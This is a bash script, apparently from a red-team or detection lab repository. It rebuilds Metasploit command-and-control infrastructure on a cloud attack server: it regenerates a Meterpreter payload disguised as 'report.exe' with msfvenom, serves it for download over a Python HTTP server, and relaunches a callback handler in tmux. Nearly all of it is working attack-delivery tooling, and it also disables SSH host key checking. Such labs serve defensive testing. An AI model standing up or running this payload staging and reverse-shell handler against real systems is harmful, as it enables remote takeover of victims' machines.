#!/bin/bash
#
# Re-establish Metasploit + HTTP delivery on the Linux attack box after a reboot (or any time
# processes died). Mirrors the Metasploit path from attack_serve_c2_payload_over_http.sh:
#   - Regenerate report.exe with msfvenom (current public IP as LHOST) unless skipped
#   - Rewrite /home/ubuntu/listener.rc
#   - Restart python3 -m http.server on the chosen port (default 8080)
#   - Restart msfconsole in tmux session "msf" (kills existing session name first)
#
# Run from repo root (same as other attack_* scripts).
#
# Usage:
#   ./scripts/attack_metasploit_restore_after_reboot.sh <region>
#
# Optional env (laptop):
#   SKIP_MSFVENOM=1       Do not re-run msfvenom; only refresh listener.rc, HTTP, and tmux.
#   HTTP_PORT=8080        Port for python http.server under /home/ubuntu (default 8080).
#   LPORT=4444            Handler / payload callback port (default 4444).
#   PAYLOAD_NAME=report.exe   Output filename under /home/ubuntu (default report.exe).
#   MSF_TMUX_SESSION=msf  tmux session name for msfconsole (default msf).
#
set -euo pipefail

REGION="${1:-apac}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
cd "${REPO_ROOT}"

# shellcheck source=/dev/null
source "${SCRIPT_DIR}/attack_c2_helpers/runner_lib.sh"

export C2_FRAMEWORK=metasploit
c2_validate_framework

SSH_KEY="terraform/certs/project-responder-ssh"
ATTACK_USER="ubuntu"
LPORT="${LPORT:-4444}"
PAYLOAD_NAME="${PAYLOAD_NAME:-report.exe}"
HTTP_PORT="${HTTP_PORT:-8080}"
MSF_TMUX_SESSION="${MSF_TMUX_SESSION:-msf}"

DETAILS_FILE="inventory/attack_server_details_${REGION}"
if [[ ! -f "${DETAILS_FILE}" ]]; then
  echo "[!] Details file not found: ${DETAILS_FILE}"
  echo "    Usage: $0 <region>  (e.g. apac, amer, star, emea)"
  exit 1
fi

ATTACK_IP=$(awk '/^Linux Bastion Public IP:/ { print $5 }' "${DETAILS_FILE}")
if [[ -z "${ATTACK_IP}" ]]; then
  echo "[!] Could not extract attack server IP from ${DETAILS_FILE}"
  exit 1
fi

FIREWALL_EIP=$(awk '/^Firewall EIP:/ { print $3 }' "${DETAILS_FILE}")
[[ -n "${FIREWALL_EIP}" ]] || FIREWALL_EIP="<FIREWALL_EIP>"

SSH_OPTS="-i ${SSH_KEY} -o StrictHostKeyChecking=no"

echo "[*] Region:              ${REGION}"
echo "[*] Attack server:       ${ATTACK_IP}"
echo "[*] Firewall EIP:        ${FIREWALL_EIP}"
echo "[*] Payload:             /home/ubuntu/${PAYLOAD_NAME}"
echo "[*] Handler LPORT:       ${LPORT}"
echo "[*] HTTP port:           ${HTTP_PORT}"
echo "[*] tmux session:        ${MSF_TMUX_SESSION}"
echo "[*] SKIP_MSFVENOM:       ${SKIP_MSFVENOM:-0}"
echo ""

LHOST_REMOTE=$(ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" curl -s http://169.254.169.254/latest/meta-data/public-ipv4)
echo "[*] Attack server public IP (LHOST): ${LHOST_REMOTE}"

if [[ "${SKIP_MSFVENOM:-0}" != "1" ]]; then
  echo "[*] Regenerating Meterpreter payload (msfvenom)..."
  c2_remote_payload "${SSH_OPTS}" "${ATTACK_USER}" "${ATTACK_IP}" "${LHOST_REMOTE}" "${LPORT}" "/home/ubuntu/${PAYLOAD_NAME}"
else
  echo "[*] SKIP_MSFVENOM=1 — leaving existing /home/ubuntu/${PAYLOAD_NAME} unchanged"
fi

echo "[*] Writing Metasploit handler resource -> /home/ubuntu/listener.rc"
c2_remote_listener_doc "${SSH_OPTS}" "${ATTACK_USER}" "${ATTACK_IP}" "${LPORT}" "/home/ubuntu/listener.rc" "${LHOST_REMOTE}"

echo "[*] Restarting HTTP server on port ${HTTP_PORT}..."
ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" bash -s <<REMOTE_SCRIPT
set -euo pipefail
HTTP_PORT=${HTTP_PORT}
PAYLOAD_NAME=${PAYLOAD_NAME}
LHOST=\$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)

fuser -k "\${HTTP_PORT}/tcp" 2>/dev/null || true
cd /home/ubuntu
nohup python3 -m http.server "\${HTTP_PORT}" > /tmp/http_server.log 2>&1 &
echo "[+] HTTP server PID: \$!"
echo "[+] Payload URL: http://\${LHOST}:\${HTTP_PORT}/\${PAYLOAD_NAME}"
REMOTE_SCRIPT

echo ""
echo "[*] Launching Metasploit handler in tmux session '${MSF_TMUX_SESSION}'..."
echo "    Reattach:  ssh ${SSH_OPTS} -t ${ATTACK_USER}@${ATTACK_IP} tmux attach -t ${MSF_TMUX_SESSION}"
echo "    Detach:    Ctrl+B then D"
echo "============================================"
c2_start_listener_tmux_or_print "${SSH_OPTS}" "${ATTACK_USER}" "${ATTACK_IP}" "${MSF_TMUX_SESSION}" "/home/ubuntu/listener.rc"

echo ""
echo "[+] Metasploit restore complete."
echo "    HTTP log: ssh ${SSH_OPTS} ${ATTACK_USER}@${ATTACK_IP} tail -f /tmp/http_server.log"
